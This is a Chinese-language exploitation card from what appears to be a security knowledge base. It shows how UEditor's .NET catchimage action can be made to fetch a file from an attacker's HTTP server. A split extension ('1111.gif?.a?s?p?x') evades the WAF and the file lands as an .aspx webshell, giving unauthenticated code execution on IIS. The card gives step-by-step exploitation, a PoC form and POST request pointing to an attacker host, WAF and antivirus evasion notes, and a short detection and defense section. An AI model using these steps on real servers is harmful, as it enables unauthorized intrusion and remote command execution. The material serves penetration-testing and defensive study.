---
id: web-generic-file-upload-ueditor-net-catchimage-source-remote-write-aspx
title: UEditor .NET catchimage source[] 抓取远端文件落 upload 目录：source 后缀可控写入 aspx webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: ueditor-net-catchimage-source-remote-file-write
tags:
- web
- file-upload
- ueditor
- dotnet
- aspx
- webshell
- catchimage
- remote-fetch
- iis
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V313
  verified_at: '2026-11-08T12:45:02+08:00'
  notes: 已对照原文与15张图核对：图01 controller.ashx 返回 action 不支持 JSON、图03 python http.server 日志出现 ?.a?s?p?x、图04/05 直接 ?.aspx 被 WAF reset、图06 catchimage 返回 SUCCESS 且 url 以 .aspx 结尾、图07 换 shell 内容后抓取错误、图08 落盘路径 404、图11/12 图片脏数据包裹加密马、图13 天蝎 whoami/apppool 命令执行、图14/15 360 主动防御/实时保护与 QQProtect，均与卡片一致。与既有 UEditor .NET uploadfile 卡（multipart，需 .ASPXAUTH 会话，只校验 Content-Type）入口/认证/触发不同，dedup 虽 likely_duplicate（cosine 0.9023）但 --force append_scenario 成立；与 J2eeFAST Java catchimage SSRF 卡语言/目标/危害不同。核对时已把 PoC Content-Length 57 修正为实际 body 长度 51。未验证点：服务端清理 ? 还原 .aspx 为结合响应与执行结果的推断（原文无源码），原文请求体/目标多处打码，未复跑 PoC。
url: /docs/web/generic/file-upload/web-generic-file-upload-ueditor-net-catchimage-source-remote-write-aspx/
draft: false
kb_aliases:
- UEditor catchimage 写 shell
- controller.ashx action=catchimage getshell
- source[] 远程文件写入
- UEditor .NET 远程抓取 getshell
- 富文本抓取远程图片 getshell
---

## 一句话结论

UEditor 的 .NET 版本暴露的 `controller.ashx?action=catchimage` 会把 `source[]` 指定的远程 URL 抓取下来并保存到 upload 目录；攻击者在自己的 HTTP 服务上托管一个文件名/后缀可控的文件（如 `1111.gif?.a?s?p?x`），即可借服务端抓取把 aspx 内容写入 Web 可执行目录，在无需后台账号的情况下获得 webshell。

## 原理

- **入口**：UEditor 富文本编辑器的 .NET 实现使用 `/Scripts/Ueditor/net/controller.ashx` 统一处理 `action`，`action=catchimage` 对应“抓取远程图片”。不带 action 时会返回 UEditor 风格的 JSON（如 `{"state":"action 参数为空或者 action 不被支持。"}`），可用来确认组件与入口。
- **是谁发的请求**：抓取由目标服务器发起，而不是浏览器。`source[]` 是一个 URL 数组，服务端逐项发起 HTTP 请求，把响应内容写入配置的 upload 目录，并在响应 JSON 的 `list[].url` 中回显落盘路径。
- **为什么能写入 webshell**：该功能只被当作“抓图”使用，没有把来源限制为图片站点，也没有在落盘后校验内容确为图片；抓到的内容按服务端文件名规则保存。攻击者只需让 `source[]` 指向自己控制的 HTTP 服务，托管内容就是任意字节。
- **后缀为什么可控**：落盘名称来自 `source` URL 的文件名部分。原文把远程文件命名为 `1111.gif?.a?s?p?x`，响应中的 `url` 以 `.aspx` 结尾；直接写 `1111.gif?.aspx` 会被 WAF 重置，而把后缀用 `?` 拆开后通过。服务端在保存时清理 Windows 文件名非法字符 `?`，`1111.gif?.a?s?p?x` 清理后即 `1111.gif.aspx`（这一步原文未给出源码，是从响应 url 与落盘执行结果推断，详见关联的后缀拆分卡）。
- **为什么危害是 RCE**：upload 目录位于 Web 根下，IIS 默认把 `.aspx` 交给 ASP.NET 执行；写入即等于在目标上获得脚本执行权限。
- **内网可行性**：原文目标为纯内网、无法出网，作者在本机 `python3 -m http.server 8080` 充当载荷托管服务；只要目标能访问攻击者主机即可完成抓取。

## 触发条件

- 目标使用 UEditor 的 .NET 版本，`controller.ashx` 可从网络访问，且 `catchimage` 未被禁用、未被网关/WAF 拦截。
- 目标服务器能出站访问攻击者控制的 HTTP 服务（同一内网直连即可）。
- upload 目录位于 Web 根下，IIS 允许 `.aspx/.ashx` 等脚本扩展执行。
- 存在 WAF/主机杀软时，还需要额外的后缀拆分与内容填充绕过（见关联卡）；否则会出现“请求被重置”或“返回路径但访问 404”。

## 利用步骤

1. 访问 `controller.ashx`（常见路径 `/Scripts/Ueditor/net/controller.ashx`），根据返回的 UEditor JSON 确认组件与入口。
2. 在攻击机启动 HTTP 服务（原文 `python3 -m http.server 8080`），先放一个普通 GIF，验证 `source[]` 抓取链路和回显 url。
3. 发送 `action=catchimage` 请求，`Content-Type: application/x-www-form-urlencoded`，`source[]=http://<攻击机>:8080/1111.gif?.a?s?p?x`。
4. 从响应 `list[].url` 取落盘路径（形如 `/upload/image/.../xxx.aspx`），访问确认是否执行；若 404，说明文件被杀软删除或被拦截，需要内容层免杀。
5. 把远程文件内容替换为可执行载荷（原文最终为图片脏数据包裹的天蝎加密 ASP.NET 马），重复抓取，访问并用客户端连接，执行命令验证。

## PoC

```html
<!-- 原文使用的表单；实际用 Burp/curl 发送 -->
<form action="http://target/Scripts/Ueditor/net/controller.ashx?action=catchimage"
      enctype="application/x-www-form-urlencoded" method="POST">
  <p>shell addr:<input type="text" name="source[]" /></p>
  <input type="submit" value="Submit" />
</form>
```

```http
POST /Scripts/Ueditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

source%5B%5D=http://attacker:8080/1111.gif?.a?s?p?x
```

```text
# 响应（结构示例）：
{"state":"SUCCESS","list":[{"state":"SUCCESS",
 "source":"http://attacker:8080/1111.gif?.a?s?p?x",
 "url":"/upload/image/.../xxxx.aspx"}]}
```

无独立可复现脚本：原文目标地址与请求体多处打码；上例为按原文截图还原的最小请求形态。

## 变体与关联

- 后缀绕过细节：[[web-generic-file-upload-question-mark-filename-sanitize-waf-aspx-bypass]]（`a?s?p?x` → 清理 `?` 后还原 `.aspx`）。
- 内容免杀：[[web-generic-file-upload-image-junk-padding-both-side-av-bypass]]（图片脏数据前后双向填充躲主机杀软）、[[web-dotnet-aspnet-webshell-compiled-assembly-evasion]]（RijndaelManaged + Assembly.Load 加密 aspx 马）。
- 同组件不同 sink：[[web-generic-file-upload-ueditor-net-controller-contenttype-aspx]]（`action=uploadfile` 只校验 Content-Type）、[[web-generic-file-upload-ueditor-filepathformat-traversal]]（filePathFormat 模板目录穿越）、[[web-generic-ssrf-j2eefast-ueditor-catchimage]]（Java 版 catchimage 作为 SSRF 打内网，重点是内网访问而非落盘 getshell）。
- 同类“远程拉取式写入”：[[web-generic-file-upload-cxf-webservice-uploadfilebyurl-suffix-webshell]]、[[web-generic-file-upload-monsta-ftp-unauth-download-write]]。
- 边界：`catchimage` 被关闭或加了鉴权、目标无法出站/无法访问攻击者主机、upload 目录禁止脚本执行、杀软实时删除落盘文件时，本链不成立；原文正是先解决后缀层 WAF、再解决内容层杀软才成功。

## 检测与防御

- 检测：`controller.ashx` 上出现 `action=catchimage` 且 `source[]` 指向非图片站点/内网地址/带 `?` 拆分后缀的 URL；响应 `list[].url` 后紧跟对该上传路径的访问。
- 检测：Web 目录新增 `.aspx/.ashx/.asmx` 等脚本文件，且内容与远程抓取时间相关；w3wp 进程随后派生子进程（cmd.exe/powershell）。
- 防御：关闭或鉴权 UEditor 的 `catchimage`；对 `source` 做协议/主机白名单，解析后校验 IP，拒绝回环、内网与元数据地址。
- 防御：上传目录移出 Web 根或禁止脚本执行；保存时按白名单生成扩展名并随机化名称，不采用远程 URL 的后缀；落盘后做图片解码/内容校验。
- 加固：升级/移除不必要的 UEditor 组件，WAF 对 `source[]` 做规范化后再检测。
